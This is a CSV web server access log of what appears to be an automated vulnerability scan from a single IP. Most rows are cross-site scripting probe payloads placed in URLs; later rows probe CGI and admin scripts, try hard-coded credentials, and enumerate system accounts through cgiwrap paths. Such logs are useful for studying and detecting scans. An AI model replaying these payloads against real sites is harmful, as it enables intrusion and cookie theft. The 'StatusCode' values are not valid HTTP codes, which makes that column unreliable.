Country,Date,IP,RequestMethod,Resource,StatusCode,Timestamp
United States,2018-03-28,76.100.27.231,POST,"/servlet/custMsg?guestName=<script>alert(\""Vulnerable\"")</script>",744,11:35:25
United States,2018-03-28,76.100.27.231,POST,"/servlet/CookieExample?cookiename=<script>alert(\""Vulnerable\"")</script>",915,11:35:25
United States,2018-03-28,76.100.27.231,GET,/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>,052,11:35:26
United States,2018-03-28,76.100.27.231,GET,"/search/index.cfm?<script>alert(\""Vulnerable\"")</script>",203,11:35:26
United States,2018-03-28,76.100.27.231,GET,/search/?SectionIDOverride=1&SearchText=<script>alert(document.cookie);</script>,335,11:35:26
United States,2018-03-28,76.100.27.231,GET,"/search.php?zoom_query=<script>alert(\""hello\"")</script>",602,11:35:26
United States,2018-03-28,76.100.27.231,GET,/search.php?searchstring=<script>alert(document.cookie)</script>,741,11:35:26
United States,2018-03-28,76.100.27.231,GET,"/search.php?searchfor=\""><script>alert(1776)</script>",872,11:35:26
United States,2018-03-28,76.100.27.231,GET,/search.asp?term=<%00script>alert('Vulnerable')</script>,990,11:35:26
United States,2018-03-28,76.100.27.231,GET,/script%3Ealert('Vulnerable')%3C/script%3E.cfm,136,11:35:27
United States,2018-03-28,76.100.27.231,GET,/samples/search.dll?query=<script>alert(document.cookie)</script>,257,11:35:27
United States,2018-03-28,76.100.27.231,GET,/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>,388,11:35:27
United States,2018-03-28,76.100.27.231,GET,/profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,518,11:35:27
United States,2018-03-28,76.100.27.231,GET,/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>,925,11:35:27
United States,2018-03-28,76.100.27.231,GET,/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1,052,11:35:28
United States,2018-03-28,76.100.27.231,GET,/pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello,207,11:35:28
United States,2018-03-28,76.100.27.231,GET,/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit,781,11:35:28
United States,2018-03-28,76.100.27.231,GET,"/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\""><script>alert('Vulnerable')</script>",989,11:35:28
United States,2018-03-28,76.100.27.231,GET,"/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\""><script>alert('Vulnerable')</script>&MMN_position=[X:X]",114,11:35:29
United States,2018-03-28,76.100.27.231,GET,"/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\""><script>alert('Vulnerable')</script>",311,11:35:29
United States,2018-03-28,76.100.27.231,GET,"/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\""><script>alert('Vulnerable')</script>",476,11:35:29
United States,2018-03-28,76.100.27.231,GET,"/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>",650,11:35:29
United States,2018-03-28,76.100.27.231,GET,/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>,810,11:35:29
United States,2018-03-28,76.100.27.231,GET,/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E,947,11:35:29
United States,2018-03-28,76.100.27.231,GET,/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>,093,11:35:30
United States,2018-03-28,76.100.27.231,GET,/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>,229,11:35:30
United States,2018-03-28,76.100.27.231,GET,/phpimageview.php?pic=javascript:alert(8754),374,11:35:30
United States,2018-03-28,76.100.27.231,GET,/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>,499,11:35:30
United States,2018-03-28,76.100.27.231,GET,/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>,638,11:35:30
United States,2018-03-28,76.100.27.231,GET,"/phpBB/viewtopic.php?t=17071&highlight=\"">\""<script>javascript:alert(document.cookie)</script>",766,11:35:30
United States,2018-03-28,76.100.27.231,GET,/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>,897,11:35:30
United States,2018-03-28,76.100.27.231,GET,/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>,036,11:35:31
United States,2018-03-28,76.100.27.231,GET,/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E,172,11:35:31
United States,2018-03-28,76.100.27.231,GET,"/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>",330,11:35:31
United States,2018-03-28,76.100.27.231,GET,/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>,472,11:35:31
United States,2018-03-28,76.100.27.231,GET,/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;,618,11:35:31
United States,2018-03-28,76.100.27.231,GET,/node/view/666%5C%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E,755,11:35:31
United States,2018-03-28,76.100.27.231,GET,/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>,884,11:35:31
United States,2018-03-28,76.100.27.231,GET,/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>,590,11:35:32
United States,2018-03-28,76.100.27.231,GET,/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=,749,11:35:32
United States,2018-03-28,76.100.27.231,GET,/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=,874,11:35:32
United States,2018-03-28,76.100.27.231,GET,/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent,004,11:35:33
United States,2018-03-28,76.100.27.231,GET,/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent,135,11:35:33
United States,2018-03-28,76.100.27.231,GET,/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>,303,11:35:33
United States,2018-03-28,76.100.27.231,GET,"/msadm/user/login.php3?account_name=\""><script>alert('Vulnerable')</script>",418,11:35:33
United States,2018-03-28,76.100.27.231,GET,"/msadm/site/index.php3?authid=\""><script>alert('Vulnerable')</script>",541,11:35:33
United States,2018-03-28,76.100.27.231,GET,"/msadm/domain/index.php3?account_name=\""><script>alert('Vulnerable')</script>",678,11:35:33
United States,2018-03-28,76.100.27.231,GET,/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>,801,11:35:33
United States,2018-03-28,76.100.27.231,GET,/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>,941,11:35:33
United States,2018-03-28,76.100.27.231,GET,/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>,085,11:35:34
United States,2018-03-28,76.100.27.231,GET,/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>,219,11:35:34
United States,2018-03-28,76.100.27.231,GET,"/modules/Forums/bb_smilies.php?bgcolor1=\""><script>alert('Vulnerable')</script>",354,11:35:34
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>,475,11:35:34
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2,612,11:35:34
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>,753,11:35:34
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>,984,11:35:34
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>,159,11:35:35
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>,306,11:35:35
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>,439,11:35:35
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0,578,11:35:35
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>,794,11:35:35
United States,2018-03-28,76.100.27.231,GET,/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|,930,11:35:35
United States,2018-03-28,76.100.27.231,GET,/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>,459,11:35:36
United States,2018-03-28,76.100.27.231,GET,/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>,734,11:35:37
United States,2018-03-28,76.100.27.231,GET,/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>,971,11:35:37
United States,2018-03-28,76.100.27.231,GET,/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test,113,11:35:38
United States,2018-03-28,76.100.27.231,GET,/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>,364,11:35:38
United States,2018-03-28,76.100.27.231,GET,/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>,493,11:35:38
United States,2018-03-28,76.100.27.231,GET,/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>,640,11:35:38
United States,2018-03-28,76.100.27.231,GET,/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index,784,11:35:38
United States,2018-03-28,76.100.27.231,GET,/members.asp?SF=%22;}alert(223344);function%20x(){v%20=%22,941,11:35:38
United States,2018-03-28,76.100.27.231,GET,/megabook/admin.cgi?login=<script>alert('Vulnerable')</script>,163,11:35:39
United States,2018-03-28,76.100.27.231,GET,/mailman/options/yourlist?language=en&email=&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;,292,11:35:39
United States,2018-03-28,76.100.27.231,GET,/mailman/listinfo/%3Cscript%3Ealert('Vulnerable')%3C/script%3E,431,11:35:39
United States,2018-03-28,76.100.27.231,GET,"/ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\""Vulnerable\"")</script>",567,11:35:39
United States,2018-03-28,76.100.27.231,GET,/launch.jsp?NFuse_Application=<script>alert('Vulnerable')</script>,706,11:35:39
United States,2018-03-28,76.100.27.231,GET,/launch.asp?NFuse_Application=<script>alert('Vulnerable')</script>,821,11:35:39
United States,2018-03-28,76.100.27.231,GET,/jigsaw/,252,11:35:40
United States,2018-03-28,76.100.27.231,GET,/isapi/testisa.dll?check1=<script>alert(document.cookie)</script>,396,11:35:40
United States,2018-03-28,76.100.27.231,GET,/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,519,11:35:40
United States,2018-03-28,76.100.27.231,GET,"/index.php?file=Liens&op=\""><script>alert('Vulnerable');</script>",653,11:35:40
United States,2018-03-28,76.100.27.231,GET,/index.php?catid=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;,790,11:35:40
United States,2018-03-28,76.100.27.231,GET,/index.php?action=storenew&username=<script>alert('Vulnerable')</script>,921,11:35:40
United States,2018-03-28,76.100.27.231,GET,/index.php/%5C%22%3E%3Cscript%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C,326,11:35:41
United States,2018-03-28,76.100.27.231,GET,/index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script>,463,11:35:41
United States,2018-03-28,76.100.27.231,GET,/index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search,648,11:35:43
United States,2018-03-28,76.100.27.231,GET,"/include.php?path=contact.php&contact_email=\"">&lt;script&gt;alert(document.cookie);&lt;/script&gt;",846,11:35:43
United States,2018-03-28,76.100.27.231,GET,/html/partner.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>,992,11:35:43
United States,2018-03-28,76.100.27.231,GET,/html/chatheader.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>,121,11:35:44
United States,2018-03-28,76.100.27.231,GET,/html/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>,255,11:35:44
United States,2018-03-28,76.100.27.231,GET,/guestbook/?number=5&lng=%3Cscript%3Ealert(document.domain);%3C/script%3E,377,11:35:44
United States,2018-03-28,76.100.27.231,GET,/gallery/search.php?searchstring=<script>alert(document.cookie)</script>,536,11:35:44
United States,2018-03-28,76.100.27.231,GET,/friend.php?op=SiteSent&fname=<script>alert('Vulnerable')</script>,678,11:35:44
United States,2018-03-28,76.100.27.231,GET,/forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22,803,11:35:44
United States,2018-03-28,76.100.27.231,GET,/forums/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,586,11:35:45
United States,2018-03-28,76.100.27.231,GET,/forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>,727,11:35:45
United States,2018-03-28,76.100.27.231,GET,/forums/browse.php?fid=3&tid=46&go=<script>JavaScript:alert('Vulnerable');</script>,866,11:35:45
United States,2018-03-28,76.100.27.231,GET,/esp?PAGE=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,006,11:35:46
United States,2018-03-28,76.100.27.231,GET,/error/500error.jsp?et=1<script>alert('Vulnerable')</script>;,155,11:35:46
United States,2018-03-28,76.100.27.231,GET,"/downloads/pafiledb.php?action=rate&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\""",290,11:35:46
United States,2018-03-28,76.100.27.231,GET,"/downloads/pafiledb.php?action=email&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\""",417,11:35:46
United States,2018-03-28,76.100.27.231,GET,"/downloads/pafiledb.php?action=download&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\""",547,11:35:46
United States,2018-03-28,76.100.27.231,GET,/download.php?sortby=&dcategory=<script>alert('Vulnerable')</script>,661,11:35:46
United States,2018-03-28,76.100.27.231,GET,/default.php?info_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E,787,11:35:46
United States,2018-03-28,76.100.27.231,GET,/default.php?error_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E,926,11:35:46
United States,2018-03-28,76.100.27.231,GET,/comments/browse.php?fid=2&tid=4&go=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;,058,11:35:47
United States,2018-03-28,76.100.27.231,GET,/comments.php?subject=<script>alert('Vulnerable')</script>&comment=<script>alert('Vulnerable')</script>&pid=0&sid=0&mode=&order=&thold=op=Preview,186,11:35:47
United States,2018-03-28,76.100.27.231,GET,/cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)</script>,385,11:35:47
United States,2018-03-28,76.100.27.231,GET,"/chat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>",779,11:35:47
United States,2018-03-28,76.100.27.231,GET,/cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>,961,11:35:47
United States,2018-03-28,76.100.27.231,GET,/cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>,090,11:35:48
United States,2018-03-28,76.100.27.231,GET,test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;,435,11:35:48
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;,542,11:35:48
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/.cobalt/message/message.cgi?info=%3Cscript%3Ealert%28%27alert%27%29%3B%3C/script%3E,673,11:35:48
United States,2018-03-28,76.100.27.231,GET,/calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05,809,11:35:48
United States,2018-03-28,76.100.27.231,GET,"/ca000007.pl?ACTION=SHOWCART&REFPAGE=\""><script>alert('Vulnerable')</script>",950,11:35:48
United States,2018-03-28,76.100.27.231,GET,"/ca000001.pl?ACTION=SHOWCART&hop=\""><script>alert('Vulnerable')</script>&PATH=acatalog%2f",110,11:35:49
United States,2018-03-28,76.100.27.231,GET,/bb000001.pl%3Cscript%3Ealert('Vulnerable')%3C/script%3E,282,11:35:49
United States,2018-03-28,76.100.27.231,GET,/article.cfm?id=1'<script>alert(document.cookie);</script>,687,11:35:49
United States,2018-03-28,76.100.27.231,GET,/apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script>,841,11:35:49
United States,2018-03-28,76.100.27.231,GET,/anthill/login.php,233,11:35:50
United States,2018-03-28,76.100.27.231,GET,/addressbook/index.php?surname=<script>alert('Vulnerable')</script>,710,11:35:50
United States,2018-03-28,76.100.27.231,GET,/addressbook/index.php?name=<script>alert('Vulnerable')</script>,869,11:35:50
United States,2018-03-28,76.100.27.231,GET,/add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>,998,11:35:50
United States,2018-03-28,76.100.27.231,GET,/a?<script>alert('Vulnerable')</script>,178,11:35:51
United States,2018-03-28,76.100.27.231,GET,/a.jsp/%3Cscript%3Ealert('Vulnerable')%3C/script%3E,339,11:35:51
United States,2018-03-28,76.100.27.231,GET,/?mod=<script>alert(document.cookie)</script>&op=browse,463,11:35:51
United States,2018-03-28,76.100.27.231,GET,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.thtml,108,11:35:52
United States,2018-03-28,76.100.27.231,GET,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.shtml,307,11:35:52
United States,2018-03-28,76.100.27.231,GET,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.jsp,445,11:35:52
United States,2018-03-28,76.100.27.231,GET,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx,579,11:35:52
United States,2018-03-28,76.100.27.231,GET,//profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,724,11:35:52
United States,2018-03-28,76.100.27.231,GET,//comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,932,11:35:52
United States,2018-03-28,76.100.27.231,GET,/&lt;script&gt;alert('Vulnerable');&lt;/script&gt;,089,11:35:53
United States,2018-03-28,76.100.27.231,GET,/%3Cscript%3Ealert(%22xss%22)%3C/script%3E/index.html,219,11:35:53
United States,2018-03-28,76.100.27.231,GET,/%3C/title%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E,343,11:35:53
United States,2018-03-28,76.100.27.231,GET,/%3C/a%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E,586,11:35:53
United States,2018-03-28,76.100.27.231,GET,/%22%3Cscript%3Ealert(%22xss%22)%3C/script%3E,717,11:35:53
United States,2018-03-28,76.100.27.231,GET,/%22%3Cscript%3Ealert(%22xss%22)%3C/script%3E,045,11:35:54
United States,2018-03-28,76.100.27.231,GET,/%0A%0A%3Cscript%3Ealert(%5C%22Vulnerable%5C%22)%3C/script%3E.jsp,191,11:35:54
United States,2018-03-28,76.100.27.231,GET,title.cgi,330,11:35:54
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/title.cgi,503,11:35:54
United States,2018-03-28,76.100.27.231,GET,compatible.cgi,675,11:35:54
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/compatible.cgi,826,11:35:54
United States,2018-03-28,76.100.27.231,GET,/add_user.php,970,11:35:54
United States,2018-03-28,76.100.27.231,GET,probecontrol.cgi?command=enable&username=cancer&password=killer,096,11:35:55
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/probecontrol.cgi?command=enable&username=cancer&password=killer,317,11:35:55
United States,2018-03-28,76.100.27.231,GET,probecontrol.cgi?command=enable&userNikto=cancer&password=killer,263,11:35:56
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/probecontrol.cgi?command=enable&userNikto=cancer&password=killer,411,11:35:56
United States,2018-03-28,76.100.27.231,GET,retrieve_password.pl,571,11:35:56
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/retrieve_password.pl,696,11:35:56
United States,2018-03-28,76.100.27.231,GET,wwwadmin.pl,831,11:35:56
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/wwwadmin.pl,973,11:35:56
United States,2018-03-28,76.100.27.231,GET,/cfdocs/expeval/displayopenedfile.cfm,113,11:35:57
United States,2018-03-28,76.100.27.231,GET,/cfdocs/expeval/sendmail.cfm,221,11:35:57
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/bigconf.cgi,362,11:35:57
United States,2018-03-28,76.100.27.231,GET,webmap.cgi,480,11:35:57
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/webmap.cgi,639,11:35:57
United States,2018-03-28,76.100.27.231,GET,wwwwais,825,11:35:57
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/wwwwais,937,11:35:57
United States,2018-03-28,76.100.27.231,GET,/ammerum/,063,11:35:58
United States,2018-03-28,76.100.27.231,GET,/ariadne/,204,11:35:58
United States,2018-03-28,76.100.27.231,GET,/cbms/cbmsfoot.php,316,11:35:58
United States,2018-03-28,76.100.27.231,GET,/cbms/changepass.php,449,11:35:58
United States,2018-03-28,76.100.27.231,GET,/cbms/editclient.php,583,11:35:58
United States,2018-03-28,76.100.27.231,GET,/cbms/passgen.php,722,11:35:58
United States,2018-03-28,76.100.27.231,GET,/cbms/realinv.php,839,11:35:58
United States,2018-03-28,76.100.27.231,GET,/cbms/usersetup.php,002,11:35:59
United States,2018-03-28,76.100.27.231,GET,admin/admin.cgi,127,11:35:59
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/admin/admin.cgi,310,11:35:59
United States,2018-03-28,76.100.27.231,GET,admin/setup.cgi,437,11:35:59
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/admin/setup.cgi,616,11:35:59
United States,2018-03-28,76.100.27.231,GET,mt-static/mt-load.cgi,762,11:35:59
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/mt-static/mt-load.cgi,972,11:35:59
United States,2018-03-28,76.100.27.231,GET,mt-static/mt.cfg,115,11:36:00
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/mt-static/mt.cfg,349,11:36:00
United States,2018-03-28,76.100.27.231,GET,mt/mt-load.cgi,482,11:36:00
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/mt/mt-load.cgi,710,11:36:00
United States,2018-03-28,76.100.27.231,GET,mt/mt.cfg,853,11:36:00
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/mt/mt.cfg,979,11:36:00
United States,2018-03-28,76.100.27.231,GET,/cgi-bin-sdb/printenv,102,11:36:01
United States,2018-03-28,76.100.27.231,GET,/ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C,293,11:36:01
United States,2018-03-28,76.100.27.231,GET,/db/users.dat,490,11:36:01
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~adm,719,11:36:01
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~adm,964,11:36:01
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~bin,144,11:36:02
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~bin,508,11:36:02
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~daemon,762,11:36:02
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~daemon,911,11:36:02
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~ftp,054,11:36:03
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~ftp,186,11:36:03
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~guest,371,11:36:03
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~guest,543,11:36:03
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~listen,686,11:36:03
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~listen,146,11:36:04
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~lp,538,11:36:04
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~lp,678,11:36:04
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~mysql,791,11:36:04
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~mysql,008,11:36:05
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~noaccess,256,11:36:05
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~noaccess,477,11:36:05
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~nobody,631,11:36:05
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~nobody,833,11:36:05
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~nobody4,980,11:36:05
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~nobody4,191,11:36:06
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~nuucp,335,11:36:06
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~nuucp,467,11:36:06
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~operator,603,11:36:06
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~operator,739,11:36:06
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~root,864,11:36:06
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~root,992,11:36:06
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~smmsp,121,11:36:07
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~smmsp,254,11:36:07
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~smtp,373,11:36:07
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~smtp,512,11:36:07
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~sshd,702,11:36:07
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~sshd,844,11:36:07
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~sys,983,11:36:07
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~sys,185,11:36:08
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~test,379,11:36:08
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~test,563,11:36:08
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~unknown,735,11:36:08
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~unknown,864,11:36:08
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~uucp,000,11:36:09
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~uucp,138,11:36:09
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~web,288,11:36:09
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~web,548,11:36:09
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~www,667,11:36:09
United States,2018-03-28,76.100.27.231,GET,/cgi-bin/cgiwrap/~www,814,11:36:09
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~adm,960,11:36:09
United States,2018-03-28,76.100.27.231,GET,cgiwrap/~bin,111,11:36:10
